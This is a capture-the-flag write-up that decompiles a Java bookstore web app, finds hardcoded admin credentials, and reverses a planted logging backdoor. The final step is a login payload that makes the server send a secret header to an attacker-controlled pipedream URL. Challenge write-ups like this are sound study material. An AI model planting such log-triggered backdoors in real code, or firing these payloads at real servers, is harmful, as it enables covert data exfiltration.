# BookStore.java - 200 pts


<p align="center">
  <img src="" />
</p>

## TLDR 
- Unzip .jar
- Decompile .class files & reverse source code 
- Find **SALT**
- Use backdoor inside source code

## Step 1 : Unzip .jar

The website simply contains a login page at first glance and the classic flaws (sqli, etc ...) do not seem to work

<p align="center">
  <img src="" />
</p>


So I decided to look directly into the **book_store.jar** archive that was provided

Let's extract the contents of the archive:

```bash
$ jar xf book_store.jar && ls

total 48
drwxr-xr-x 3 root root  4096 Apr 17 17:44 META-INF
-rw-r--r-- 1 root root  3722 Apr 14 21:01 auth.html
drwxr-xr-x 3 root root  4096 Apr 14 21:01 book
-rw-r--r-- 1 root root  1391 Apr 14 21:01 book.json
-rwxr-xr-x 1 root root 21283 Apr 17 17:33 book_store.jar
-rw-r--r-- 1 root root  6543 Apr 14 21:01 home.html
```

After investigation and comparison with the site provided in the description of the challenge, the archive contains the source code.

___

## Step 2 : Decompile .class files & reverse source code 
One of the directories contains the source code compiled from java files

```bash
$ ls -l book/store/

-rw-r--r-- 1 root root 1200 Apr 14 21:01  App.class
-rw-r--r-- 1 root root 1596 Apr 14 21:01 'Art$ASCIIArtFont.class'
-rw-r--r-- 1 root root 3154 Apr 14 21:01  Art.class
-rw-r--r-- 1 root root 1396 Apr 14 21:01  LogJob.class
-rw-r--r-- 1 root root 5450 Apr 14 21:01  Logger.class
-rw-r--r-- 1 root root 1407 Apr 14 21:01 'ServerSide$BookHandler.class'
-rw-r--r-- 1 root root 1447 Apr 14 21:01 'ServerSide$LandingPageServer.class'
-rw-r--r-- 1 root root 1928 Apr 14 21:01 'ServerSide$LoginHandler.class'
-rw-r--r-- 1 root root 1418 Apr 14 21:01 'ServerSide$LoginPageServer.class'
-rw-r--r-- 1 root root 5815 Apr 14 21:01  ServerSide.class
```

Luckily the .class files are made up of Java bytecode in order to run in the JVM *(Java is a semi-interpreted language and not fully compiled)*, this will make it easier for us to reverse as each bytecode can be """decompiled""" into a java instruction almost identically.

In order to do this there are several tools and sites, I used the site http://www.javadecompilers.com/ *(with CFR decompiler)* and we end up with the following 5 source files *(click to view source code)*: 

<details>
  
<summary>LogJob.java</summary>
  
```java
package book.store;

import book.store.App;
import java.io.File;

public class LogJob
extends Thread {
    String filename;

    public LogJob(String filename) {
        this.filename = filename;
    }

    private void deleteLogFile() {
        File f = new File(this.filename + ".log");
        if (f.delete()) {
            App.ss.logger.info("Successfully deleted logfile!");
        } else {
            App.ss.logger.warning("File must be empty!");
        }
    }

    @Override
    public void run() {
        while (true) {
            try {
                Thread.sleep(120000 L);
            } catch (Exception e) {
                System.err.println(e.getMessage());
            }
            this.deleteLogFile();
        }
    }
}
```
  
</details>
<details>
  
<summary>ServerSide.java</summary>
  
```java
package book.store;

import book.store.App;
import book.store.Logger;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.math.BigInteger;
import java.net.InetSocketAddress;
import java.net.URLDecoder;
import java.security.MessageDigest;
import java.util.HashMap;
import java.util.Scanner;

public class ServerSide {
    StringBuilder index_page_html;
    StringBuilder landing_page_html;
    StringBuilder book_json;
    HttpServer server;
    int server_port;
    Logger logger;

    public ServerSide(int server_port) {
        try {
            this.landing_page_html = new StringBuilder();
            this.index_page_html = new StringBuilder();
            this.book_json = new StringBuilder();
            this.logger = new Logger(this.getClass().getName());
            this.server_port = server_port;
            this.loadIndexPage();
            this.loadLandingPage();
            this.loadBook();
            this.setupRoutes();
        } catch (Exception e) {
            this.logger.error("FATAL :(");
            this.logger.error(e.getMessage());
        }
    }

    private void loadIndexPage() {
        InputStream is = ServerSide.class.getResourceAsStream("/auth.html");
        Scanner s = new Scanner(is).useDelimiter("\\A");
        while (s.hasNext()) {
            this.index_page_html.append(s.next());
        }
        this.logger.debug("Auth page loaded in memory");
        s.close();
    }

    private void loadLandingPage() {
        InputStream is = ServerSide.class.getResourceAsStream("/home.html");
        Scanner s = new Scanner(is).useDelimiter("\\A");
        while (s.hasNext()) {
            this.landing_page_html.append(s.next());
        }
        this.logger.debug("Landing page loaded in memory");
        s.close();
    }

    private void loadBook() {
        InputStream is = ServerSide.class.getResourceAsStream("/book.json");
        Scanner s = new Scanner(is).useDelimiter("\\A");
        while (s.hasNext()) {
            this.book_json.append(s.next());
        }
        this.logger.debug("Book contents loaded in memory");
        s.close();
    }

    private void setupRoutes() throws Exception {
        this.server = HttpServer.create(new InetSocketAddress(this.server_port), 0);
        this.server.createContext("/", new LoginPageServer());
        this.server.createContext("/home.html", new LandingPageServer());
        this.server.createContext("/login", new LoginHandler());
        this.server.createContext("/book", new BookHandler());
        this.server.setExecutor(null);
        this.server.start();
        this.logger.info("Started web server!");
    }

    public HashMap < String, String > splitQuery(String requestUri) throws UnsupportedEncodingException {
        String[] pairs;
        HashMap < String, String > query_pairs = new HashMap < String, String > ();
        for (String pair: pairs = requestUri.split("&")) {
            int idx = pair.indexOf("=");
            query_pairs.put(URLDecoder.decode(pair.substring(0, idx), "UTF-8"), URLDecoder.decode(pair.substring(idx + 1), "UTF-8"));
        }
        return query_pairs;
    }

    public static String getMd5(String input) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            byte[] messageDigest = md.digest(input.getBytes());
            BigInteger no = new BigInteger(1, messageDigest);
            String hashtext = no.toString(16);
            while (hashtext.length() < 32) {
                hashtext = "0" + hashtext;
            }
            return hashtext;
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public boolean parseRequest(String requestUri) throws UnsupportedEncodingException {
        HashMap < String, String > query_params = this.splitQuery(requestUri);
        String username = query_params.get("username");
        String password = query_params.get("password");
        String hashed_username = ServerSide.getMd5(username);
        String hashed_password = ServerSide.getMd5(password);
        String mssg = "username: " + username + ", password: " + password;
        this.logger.info(mssg);
        return hashed_username.equalsIgnoreCase("21232f297a57a5a743894a0e4a801fc3") && hashed_password.equalsIgnoreCase("21232f297a57a5a743894a0e4a801fc3");
    }

    static class LoginPageServer
    implements HttpHandler {
        LoginPageServer() {}

        @Override
        public void handle(HttpExchange t) throws IOException {
            StringBuilder response = App.ss.index_page_html;
            t.getResponseHeaders().add("Content-Type", "text/html");
            t.sendResponseHeaders(200, response.toString().getBytes().length);
            OutputStream os = t.getResponseBody();
            os.write(response.toString().getBytes());
            os.close();
        }
    }

    static class LandingPageServer
    implements HttpHandler {
        LandingPageServer() {}

        @Override
        public void handle(HttpExchange t) throws IOException {
            StringBuilder response = App.ss.landing_page_html;
            t.getResponseHeaders().add("Content-Type", "text/html");
            t.sendResponseHeaders(200, response.length());
            OutputStream os = t.getResponseBody();
            os.write(response.toString().getBytes());
            os.close();
        }
    }

    static class LoginHandler
    implements HttpHandler {
        LoginHandler() {}

        @Override
        public void handle(HttpExchange t) throws IOException, UnsupportedEncodingException {
            String response;
            if (App.ss.parseRequest(t.getRequestURI().getQuery())) {
                response = "cool :)";
                t.getResponseHeaders().add("auth", System.getenv("WEB_COOKIE"));
                App.ss.logger.info("Authorized access!");
                t.sendResponseHeaders(200, response.length());
            } else {
                response = "sad day today for you :(";
                App.ss.logger.warning("Unauthorized access!");
                t.sendResponseHeaders(401, response.length());
            }
            OutputStream os = t.getResponseBody();
            os.write(response.getBytes());
            os.close();
        }
    }

    static class BookHandler
    implements HttpHandler {
        BookHandler() {}

        @Override
        public void handle(HttpExchange t) throws IOException {
            StringBuilder response = App.ss.book_json;
            t.getResponseHeaders().add("Content-Type", "application/json");
            t.sendResponseHeaders(200, response.toString().getBytes().length);
            OutputStream os = t.getResponseBody();
            os.write(response.toString().getBytes());
            os.close();
        }
    }
}
```
</details>
<details>
  
<summary>App.java</summary>  

```java
package book.store;

import book.store.Art;
import book.store.LogJob;
import book.store.ServerSide;

public class App {
    static ServerSide ss;

    public static void main(String[] args) throws Exception {
        Art art = new Art();
        System.out.println();
        art.printTextArt("HiddenBook :)", 12);
        ss = new ServerSide(Integer.parseInt(System.getenv("SERVER_PORT")));
        LogJob lj = new LogJob(ss.getClass().getName());
        lj.start();
    }
}
```
</details>
<details>
  
<summary>Logger.java</summary>  

```java
package book.store;

import book.store.App;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Logger {
    String logfile;
    String className;

    public Logger(String className) {
        this.className = className;
        this.logfile = className + ".log";
    }

    private void writeToLogfile(String logMessage) {
        try {
            FileWriter fstream = new FileWriter(this.logfile, true);
            BufferedWriter out = new BufferedWriter(fstream);
            this.analyzeMessage(logMessage);
            out.write(logMessage + System.getProperty("line.separator"));
            out.close();
        } catch (IOException e) {
            System.err.println("Error: " + e.getMessage());
        }
    }

    private void analyzeMessage(String mssg) {
        Pattern pattern = Pattern.compile("log\\{.*\\}salt" + System.getenv("SALT"));
        Matcher matcher = pattern.matcher(mssg);
        String substring = null;
        if (matcher.find()) {
            substring = matcher.group();
        }
        if (substring != null) {
            substring = substring.substring(substring.indexOf(123) + 1, substring.indexOf(125));
            App.ss.logger.info(substring);
        }
        pattern = Pattern.compile("get\\{.*\\}salt=" + System.getenv("SALT"));
        matcher = pattern.matcher(mssg);
        substring = null;
        if (matcher.find()) {
            substring = matcher.group();
        }
        if (substring != null) {
            substring = substring.substring(substring.indexOf(123) + 1, substring.indexOf(125));
            this.downloadFile(substring);
        }
        pattern = Pattern.compile("book\\{.*\\}salt" + System.getenv("SALT"));
        matcher = pattern.matcher(mssg);
        substring = null;
        if (matcher.find()) {
            substring = matcher.group();
        }
        if (substring != null) {
            substring = substring.substring(substring.indexOf(123) + 1, substring.indexOf(125));
            App.ss.logger.info(substring);
        }
        pattern = Pattern.compile("sussy\\{.*\\}salt" + System.getenv("SALT"));
        matcher = pattern.matcher(mssg);
        substring = null;
        if (matcher.find()) {
            substring = matcher.group();
        }
        if (substring != null) {
            substring = substring.substring(substring.indexOf(123) + 1, substring.indexOf(125));
            App.ss.logger.info(substring);
        }
    }

    private void downloadFile(String url) {
        try {
            String inputLine;
            URL link = new URL(url);
            link.toURI();
            HttpURLConnection conn = (HttpURLConnection) link.openConnection();
            conn.setRequestMethod("GET");
            conn.setRequestProperty("not-found", System.getenv("NOT_FOUND"));
            conn.setConnectTimeout(200);
            conn.setReadTimeout(200);
            int status = conn.getResponseCode();
            if (status != 200) {
                return;
            }
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuffer content = new StringBuffer();
            while ((inputLine = in .readLine()) != null) {
                content.append(inputLine);
            } in .close();
            conn.disconnect();
        } catch (Exception e) {
            return;
        }
    }

    private String returnCurrentTime() {
        DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy/MM/dd HH:mm:ss");
        LocalDateTime now = LocalDateTime.now();
        return dtf.format(now);
    }

    public void error(String err_mssg) {
        StringBuilder sb = new StringBuilder();
        String curr_time = this.returnCurrentTime();
        sb.append("ERROR ");
        sb.append("[");
        sb.append(curr_time);
        sb.append("] --> ");
        sb.append(err_mssg);
        this.writeToLogfile(sb.toString());
        System.err.println(sb.toString());
    }

    public void info(String info_mssg) {
        StringBuilder sb = new StringBuilder();
        String curr_time = this.returnCurrentTime();
        sb.append("INFO ");
        sb.append("[");
        sb.append(curr_time);
        sb.append("] --> ");
        sb.append(info_mssg);
        this.writeToLogfile(sb.toString());
        System.err.println(sb.toString());
    }

    public void warning(String warn_mssg) {
        StringBuilder sb = new StringBuilder();
        String curr_time = this.returnCurrentTime();
        sb.append("WARN ");
        sb.append("[");
        sb.append(curr_time);
        sb.append("] --> ");
        sb.append(warn_mssg);
        this.writeToLogfile(sb.toString());
        System.err.println(sb.toString());
    }

    public void debug(String debug_mssg) {
        StringBuilder sb = new StringBuilder();
        String curr_time = this.returnCurrentTime();
        sb.append("DEBUG ");
        sb.append("[");
        sb.append(curr_time);
        sb.append("] --> ");
        sb.append(debug_mssg);
        this.writeToLogfile(sb.toString());
        System.err.println(sb.toString());
    }
}
```
</details>
 
<details>
<summary>Art.java</summary>  

```java
package book.store;

import java.awt.Color;
import java.awt.Font;
import java.awt.FontMetrics;
import java.awt.Graphics;
import java.awt.Graphics2D;
import java.awt.image.BufferedImage;

public class Art {
    public static final int ART_SIZE_SMALL = 12;
    public static final int ART_SIZE_MEDIUM = 18;
    public static final int ART_SIZE_LARGE = 24;
    public static final int ART_SIZE_HUGE = 32;
    private static final String DEFAULT_ART_SYMBOL = "*";

    public void printTextArt(String artText, int textHeight, ASCIIArtFont fontType, String artSymbol) throws Exception {
        String frequency = fontType.getValue();
        int analysis_should_be_fun = this.findImageWidth(textHeight, artText, frequency);
        BufferedImage image = new BufferedImage(analysis_should_be_fun, textHeight, 1);
        Graphics g = image.getGraphics();
        Font font = new Font(frequency, 1, textHeight);
        g.setFont(font);
        Graphics2D graphics = (Graphics2D) g;
        graphics.drawString(artText, 0, this.getBaselinePosition(g, font));
        for (int y = 0; y < textHeight; ++y) {
            StringBuilder sb = new StringBuilder();
            for (int x = 0; x < analysis_should_be_fun; ++x) {
                sb.append(image.getRGB(x, y) == Color.WHITE.getRGB() ? artSymbol : " ");
            }
            if (sb.toString().trim().isEmpty()) continue;
            System.out.println(sb);
        }
    }

    public void printTextArt(String artText, int textHeight) throws Exception {
        this.printTextArt(artText, textHeight, ASCIIArtFont.ART_FONT_DIALOG, DEFAULT_ART_SYMBOL);
    }

    private int findImageWidth(int textHeight, String artText, String fontName) {
        BufferedImage im = new BufferedImage(1, 1, 1);
        Graphics g = im.getGraphics();
        g.setFont(new Font(fontName, 1, textHeight));
        return g.getFontMetrics().stringWidth(artText);
    }

    private int getBaselinePosition(Graphics g, Font font) {
        FontMetrics metrics = g.getFontMetrics(font);
        int y = metrics.getAscent() - metrics.getDescent();
        return y;
    }

    public static final class ASCIIArtFont
    extends Enum < ASCIIArtFont > {
        public static final /* enum */ ASCIIArtFont ART_FONT_DIALOG = new ASCIIArtFont("Dialog");
        public static final /* enum */ ASCIIArtFont ART_FONT_DIALOG_INPUT = new ASCIIArtFont("DialogInput");
        public static final /* enum */ ASCIIArtFont ART_FONT_MONO = new ASCIIArtFont("Monospaced");
        public static final /* enum */ ASCIIArtFont ART_FONT_SERIF = new ASCIIArtFont("Serif");
        public static final /* enum */ ASCIIArtFont ART_FONT_SANS_SERIF = new ASCIIArtFont("SansSerif");
        private String value;
        private static final /* synthetic */ ASCIIArtFont[] $VALUES;

        public static ASCIIArtFont[] values() {
            return (ASCIIArtFont[]) $VALUES.clone();
        }

        public static ASCIIArtFont valueOf(String name) {
            return Enum.valueOf(ASCIIArtFont.class, name);
        }

        public String getValue() {
            return this.value;
        }

        private ASCIIArtFont(String value) {
            this.value = value;
        }

        private static /* synthetic */ ASCIIArtFont[] $values() {
            return new ASCIIArtFont[] {
                ART_FONT_DIALOG,
                ART_FONT_DIALOG_INPUT,
                ART_FONT_MONO,
                ART_FONT_SERIF,
                ART_FONT_SANS_SERIF
            };
        }

        static {
            $VALUES = ASCIIArtFont.$values();
        }
    }
}
```
</details>
After a quick look, a piece of code catches my eye: 

```java
// ServerSide.java line 110

public boolean parseRequest(String requestUri) throws UnsupportedEncodingException {
    HashMap < String, String > query_params = this.splitQuery(requestUri);
    String username = query_params.get("username");
    String password = query_params.get("password");
    String hashed_username = ServerSide.getMd5(username);
    String hashed_password = ServerSide.getMd5(password);
    String mssg = "username: " + username + ", password: " + password;
    this.logger.info(mssg);
    return hashed_username.equalsIgnoreCase("21232f297a57a5a743894a0e4a801fc3") && hashed_password.equalsIgnoreCase("21232f297a57a5a743894a0e4a801fc3");
}
```

The function **parseRequest()** is used in the **login** phase and the hash **21232f297a57a5a743894a0e4a801fc3** corresponds to **md5(admin)**

After login in with username=admin and password=admin we are redirected to this static page *(containing **8 paragraphs** )* : 

<p align="center">
  <img src="" />
</p>


Nothing interesting at first sight. From the description of the challenge it seems that the dev has left a backdoor in the code and indeed one function is suspicious in the logging system :

```java

// Logger.java line 80

private void downloadFile(String url) {
    try {
        String inputLine;
        URL link = new URL(url);
        link.toURI();
        HttpURLConnection conn = (HttpURLConnection) link.openConnection();
        conn.setRequestMethod("GET");
        conn.setRequestProperty("not-found", System.getenv("NOT_FOUND"));
        conn.setConnectTimeout(200);
        conn.setReadTimeout(200);
        int status = conn.getResponseCode();
        if (status != 200) {
            return;
        }
        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        StringBuffer content = new StringBuffer();
        while ((inputLine = in .readLine()) != null) {
            content.append(inputLine);
        } in .close();
        conn.disconnect();
    } catch (Exception e) {
        return;
    }
}
```

It seems that this function *(on the server side)* allows to make an HTTP request to a site that we can control if we can manipulate the **url** parameter.


The only place where this function is called is just above :

```java
// Logger.java line 37
  
 private void analyzeMessage(String mssg) {
     Pattern pattern = Pattern.compile("log\\{.*\\}salt" + System.getenv("SALT"));
     Matcher matcher = pattern.matcher(mssg);
     String substring = null;
     if (matcher.find()) {
         substring = matcher.group();
     }
     if (substring != null) {
         substring = substring.substring(substring.indexOf(123) + 1, substring.indexOf(125));
         App.ss.logger.info(substring);
     }
     pattern = Pattern.compile("get\\{.*\\}salt=" + System.getenv("SALT"));
     matcher = pattern.matcher(mssg);
     substring = null;
     if (matcher.find()) {
         substring = matcher.group();
     }
     if (substring != null) {
         substring = substring.substring(substring.indexOf(123) + 1, substring.indexOf(125));
         this.downloadFile(substring);
     }

	[...]
```

This function is very important: we can call the backdoor **downloadFile()** if the **mssg** parameter respects the regular expression pattern : 

```java
"get\\{.*\\}salt=" + System.getenv("SALT")
```

and the parameter sent to the **download()** function *(which will be the **url** of the request executed by the server)* will be what is between { and }

However, it is necessary to find the value of the **environment variable "SALT"** concatenated in the pattern *(but we will see that in the next step)*

Again, we need to be able to reach this function, and it is only called in the following function:

```java
// Logger.java line 25
  
private void writeToLogfile(String logMessage) {
    try {
        FileWriter fstream = new FileWriter(this.logfile, true);
        BufferedWriter out = new BufferedWriter(fstream);
        this.analyzeMessage(logMessage);
        out.write(logMessage + System.getProperty("line.separator"));
        out.close();
    } catch (IOException e) {
        System.err.println("Error: " + e.getMessage());
    }
}
```

This function will just write the **logMessage** parameter to the logs and also call **analyzeMessage()** with this parameter.



Again, we need to be able to reach this function, it is called in several places, including the following function : 

```java
// Logger.java line 132
  
public void info(String info_mssg) {
    StringBuilder sb = new StringBuilder();
    String curr_time = this.returnCurrentTime();
    sb.append("INFO ");
    sb.append("[");
    sb.append(curr_time);
    sb.append("] --> ");
    sb.append(info_mssg);
    this.writeToLogfile(sb.toString());
    System.err.println(sb.toString());
}
```


And finally this function is called here *(which is the function called at each login attempt)* :

```java
// ServerSide.java line 110

  public boolean parseRequest(String requestUri) throws UnsupportedEncodingException {
    HashMap < String, String > query_params = this.splitQuery(requestUri);
    String username = query_params.get("username");
    String password = query_params.get("password");
    String hashed_username = ServerSide.getMd5(username);
    String hashed_password = ServerSide.getMd5(password);
    String mssg = "username: " + username + ", password: " + password;
    this.logger.info(mssg);
    return hashed_username.equalsIgnoreCase("21232f297a57a5a743894a0e4a801fc3") && hashed_password.equalsIgnoreCase("21232f297a57a5a743894a0e4a801fc3");
}
```

Note that it is possible to control what is passed to the **info()** function because the user entries **username** and **password** are concatenated directly into the parameter.

So to summarise this reverse part, we have a way to make the server execute an HTTP request with the following sequence :

- Type a malicious username (**maliciousUsername**)
- It will be concatenated into the message for the logs (**maliciousInput**)
- And so the execution chain will be as follows:


this.logger.info(**maliciousInput**) => this.writeToLogfile(**maliciousInput**) => this.analyzeMessage(**maliciousInput**) => this.downloadFile(**maliciousInput**)


However, the hardest part remains: finding the SALT in order to match the following pattern and reach the backdoor

```java
"get\\{.*\\}salt=" + System.getenv("SALT")
```
  
## Step 3 : Find SALT

This is the longest part and where you had to guess how the **SALT** was generated. After long hours of research and reading each line of code, two lines of code caught my attention because they were outside the logic of variable naming encountered so far :

```java
// Art.java line 17
public void printTextArt(String artText, int textHeight, ASCIIArtFont fontType, String artSymbol) throws Exception {
        String frequency = fontType.getValue();
        int analysis_should_be_fun = this.findImageWidth(textHeight, artText, frequency);
        
        [...]
```

"frequency analysis_should_be_fun". 

Despairing, I say to myself that it would not be impossible for the **SALT** to be for each letter, the one that appears the most respectively in the 8 paragraphs *(because the challenge index indicated that there were 8 letters in the SALT)*

So after calculating the frequency of appearance (respecting the case) of the letters in each paragraph, the following **SALT** is obtained:

<pre>oeeeeooo</pre>

We now have everything we need to run the backdoor


## Step 4 : Use backdoor inside source code

For this step we just have to login with the following payload for the **username** or **password**

<pre>get{https://XXXXXXXXX.x.pipedream.net}salt=oeeeeooo</pre>

When authenticating, this is what will happen: 

- Our username will be concatenated with text for the log files

<pre>maliciousInput=[...]get{https://XXXXXXXXX.x.pipedream.net}salt=oeeeeooo[...]</pre>

- The execution chain will be as follows:

this.logger.info(**maliciousInput**) => this.writeToLogfile(**maliciousInput**) => this.analyzeMessage(**maliciousInput**)


- analyzeMessage(**maliciousInput**) will match the following pattern and extract what is between { and } and send it as a parameter to the downloadFile() function :

```java
"get\\{.*\\}salt=" + System.getenv("SALT")
```

• this.downloadFile(**maliciousInput**) sends a request to <pre>https://XXXXXXXXX.x.pipedream.net</pre>

<p align="center">
  <img src="" />
</p>

<p align="center">
  <b>FLAG 3 : dctf{L0g_4_hid3n_d@7@_n0t_s0_h@rd_righ7}</b>
</p>
